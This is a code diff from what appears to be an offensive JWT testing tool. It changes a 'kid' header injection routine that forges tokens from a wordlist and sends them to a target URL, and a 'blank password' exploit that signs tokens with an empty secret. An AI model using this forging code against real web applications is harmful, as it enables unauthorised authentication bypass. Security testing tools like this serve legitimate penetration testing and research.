@@ -39,6 +39,7 @@ def kid_injection(args) :
         header_base_dict = analyzer.get_header_args(args.token)
     to_dump = ""
     print(header_base_dict)
+    args.play = analyzer.get_playload_json(args.token)
     for word in words :
         print("Kid : " + word)
         header_base_dict["kid"] = word
@@ -49,13 +50,14 @@ def kid_injection(args) :
             sys.exit()
         args.head = current_header_json
         current_token = crypto.create_token(args)
+        print(current_token)
         if args.url is not None :
             if args.post :
                 requestor.request_post(args, current_token)
             else :
                 requestor.request_get(args, current_token)
         else :
-            to_dump += "Kid : " + current_token + "\n"
+            to_dump += "Kid " + word + " : " + current_token + "\n"
         print("\r")
     if args.url is None :
         try :
@@ -88,10 +90,12 @@ def blank_password(args) :
     if args.secret_key is not None :
         args.token = crypto.create_token(args)
         print(args.token)
-    if args.post :
-        request = requestor.request_post(args, args.token)
-    else :
-        request = requestor.request_get(args, args.token)
+    print(args.token)
+    if args.url is not None :
+        if args.post :
+            request = requestor.request_post(args, args.token)
+        else :
+            request = requestor.request_get(args, args.token)
     print(visual.title("END blank password exploit"))
     True
 
